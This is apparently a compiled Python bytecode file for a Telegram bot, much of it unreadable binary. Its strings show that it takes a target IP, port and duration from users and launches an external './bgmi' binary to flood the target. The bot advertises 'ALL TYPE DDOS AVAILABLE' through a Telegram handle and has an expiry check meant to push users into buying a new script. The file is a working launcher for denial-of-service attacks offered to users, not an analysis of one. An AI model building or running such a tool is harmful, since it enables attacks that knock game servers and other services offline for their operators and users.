�
    �;g�  �                   �V  � d dl Z d dlZd dlmZmZmZ d dlmZmZm	Z	m
Z
mZmZ d dlmZ d dlmZ  ej                   dej"                  ��       dZ ed	d
d�      Zdadadadad� Zdedej2                  fd�Zdedej2                  fd�Zdedej2                  fd�Zd� Zedk(  r e�        yy)�    N)�Update�InlineKeyboardButton�InlineKeyboardMarkup)�Application�CommandHandler�MessageHandler�CallbackQueryHandler�ContextTypes�filters)�TOKEN)�datetimez4%(asctime)s - %(name)s - %(levelname)s - %(message)s)�format�levelz./bgmii�  �
   �   c                  �@   � t        j                  �       } | t        kD  ryy)NTF)r   �now�EXPIRY_DATE)�current_dates    �bgmi.py�check_expiryr      s   � ��<�<�>�L��k�!���    �update�contextc              �   ��  K  � | j                   j                  j                  }t        �       rt	        dd��      gg}t        |�      }| j                   j                  d|��      � d {  ���  t	        dd��      gg}t        |�      }| j                   j                  d|��      � d {  ���  y t	        dd	�
�      gg}t        |�      }| j                   j                  d|��      � d {  ���  y 7 ��7 �G7 �	�w)NzSEND MESSAGEz#https://t.me/Bgmi_hack_official_bot)�urluS   🚀This script has expired. DM for New Script. Made by t.me/Bgmi_hack_official_bot��reply_markupzJOIN @Bgmi_hack_official_botuS   📢@Bgmi_hack_official_bot ddos
ALL TYPE DDOS AVAILABLE:-
 @Bgmi_hack_official_botu   🚀Attack🚀�attack��callback_datau;    🚀Press the Attack button to start Attack  (●'◡'●))�message�	from_user�idr   r   r   �
reply_text)	r   r   �user_id�	keyboard1�reply_markup1�	keyboard2�reply_markup2�keyboardr   s	            r   �startr,      s	  � �� ��n�n�&�&�)�)�G� �~�*�>�?d�e�f�g�	�,�Y�7���n�n�'�'�a�&� (� 
� 	
� 	
� +�+I�Ot�u�v�w�	�,�Y�7���n�n�'�'�c�&� (� 
� 	
� 	
� 	� &�&6�h�O�P�Q�H�'��1�L�
�.�.�
#�
#�E�!� $� � � �#	
��	
���s6   �A%C2�'C,�(>C2�&C.�'?C2�&C0�'C2�.C2�0C2c           	   �   �  K  � | j                   }|j                  j                  }|j                  �       � d {  ���  |j                  dk(  r$|j
                  j                  d�      � d {  ���  y |j                  dk(  r�t        �v	 t        j                  t        t        t        t        �      t        t        �      g�      a|j
                  j                  dt        � dt        � dt        � d��      � d {  ���  y |j
                  j                  d
�      � d {  ���  y |j                  dk(  ret        �;	 t        j%                  �        |j
                  j                  d�      � d {  ���  d ay |j
                  j                  d�      � d {  ���  y |j                  dk(  r*d ad ad a|j
                  j                  d�      � d {  ���  y y 7 ���7 ��f7 ��# t        $ rF}t!        j"                  d|� ��       |j
                  j                  d	�      � d {  ���7   Y d }~y d }~ww xY w7 ��7 ��# t        $ rF}t!        j"                  d|� ��       |j
                  j                  d�      � d {  ���7   Y d }~y d }~ww xY w7 ��7 ���w)Nr   uU    Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀�start_attacku2    (●'◡'●) Attack start ho chuka hai :- 👉  �:z for z	 seconds zError starting attack: zError starting attack.zAttack is already running.�stop_attacku>   Attack stop 100%  (●'◡'●) 
 DM-: @Bgmi_hack_official_botzError stopping attack: zError stopping attack.zNo attack is currently running.�reset_attacku_   Attack reset. 
Please enter the target, port, and time in the format:<target> <port> <time>🚀)�callback_queryr#   r$   �answer�datar"   r%   �process�
subprocess�Popen�BINARY_PATH�	target_ip�str�target_port�attack_time�	Exception�logging�error�	terminate)r   r   �queryr&   �es        r   �button_handlerrC   >   sM  � �� � �!�!�E��o�o� � �G�
�,�,�.����z�z�X���m�m�&�&�'~����	���~�	%��?�I�$�*�*�K��C��DT�VY�Ze�Vf�+g�h���m�m�.�.�1c�dm�cn�no�p{�o|�  }B�  CN�  BO�  OX�  0Y�  Z�  Z�  Z�
 �-�-�*�*�+G�H�H�H�	���}�	$���I��!�!�#��m�m�.�.�/p�q�q�q���
 �-�-�*�*�+L�M�M�M�	���~�	%��	������m�m�&�&�  (J�  K�  	K�  	K�	 
&�5 �� 	@�� Z��� I���� 7��s�;�<��m�m�.�.�/G�H�H�H��I�� I��
 r��� I���� 7��s�;�<��m�m�.�.�/G�H�H�H��I�� N��
 	K�s�   �6J�G�1J�*G�+J�A/G �5G�6G �:J�H'�J�52H, �'H*�(H, �.J�I>�8J�J �J�J�G �	H$�6H�H�H�J�H$�$J�*H, �,	I;�56I6�+I.�,I6�1J�6I;�;J� Jc           	   �   �  K  � | j                   j                  j                  }	 | j                   j                  j	                  �       \  }}}|at        |�      at        |�      at        dd��      gt        dd��      gt        dd��      gg}t        |�      }| j                   j                  dt
        � d	t        � d
t        � d�|��      � d {  ���  y 7 �# t        $ r' | j                   j                  d�      � d {  ���7   Y y w xY w�w)Nu   Start Attack🚀r.   r    u   Stop Attack❌r0   u   Reset Attack⚙️r1   zTarget: z, Port: z, Time: z) seconds configured.Now choose an action:r   uo   Invalid format. Please enter in the format: <target> <port> <time>🚀🚀 https://t.me/Bgmi_hack_official_bot )r"   r#   r$   �text�splitr9   �intr;   r<   r   r   r%   �
ValueError)r   r   r&   �target�port�timer+   r   s           r   �handle_inputrL   d   s  � �� � �n�n�&�&�)�)�G�[�#�^�^�0�0�6�6�8����d��	��$�i���$�i�� "�"4�N�S�T�!�"2�-�P�Q�!�"6�n�U�V�
��
 ,�H�5���n�n�'�'�(�9�+�X�k�]�RZ�[f�Zg� h@� )@�NZ� (� \� 	\� 	\��� [��n�n�'�'�  )Z�  [�  	[�  	[�[�sG   �!D	�B*C �C�C �D	�C �'D�=D �>D�D	�D�D	c                  �  � t        j                  �       j                  t        �      j	                  �       } | j                  t        dt        �      �       | j                  t        t        d��      �       | j                  t        t        j                  t        j                   z  t        �      �       | j                  �        y )Nr,   z0^(attack|start_attack|stop_attack|reset_attack)$)�pattern)r   �builder�tokenr   �build�add_handlerr   r,   r	   rC   r   r   �TEXT�COMMANDrL   �run_polling)�applications    r   �mainrW   |   s�   � ��%�%�'�-�-�e�4�:�:�<�K� ���N�7�E�:�;� ���0��I{�|�}� ���N�7�<�<�7�?�?�:J�+J�L�Y�Z� ���r   �__main__)r6   r>   �telegramr   r   r   �telegram.extr   r   r   r	   r
   r   �bgmiir   r   �basicConfig�INFOr8   r   r5   r9   r;   r<   r   �DEFAULT_TYPEr,   rC   rL   rW   �__name__� r   r   �<module>ra      s�   �� � � G� G� q� q� � � �� � �Q�Y`�Ye�Ye� f� �� �t�R��$�� ���	�������� ��)B�)B� �>#K�� #K�,�2K�2K� #K�L[�v� [��0I�0I� [�0�  �z���F� r   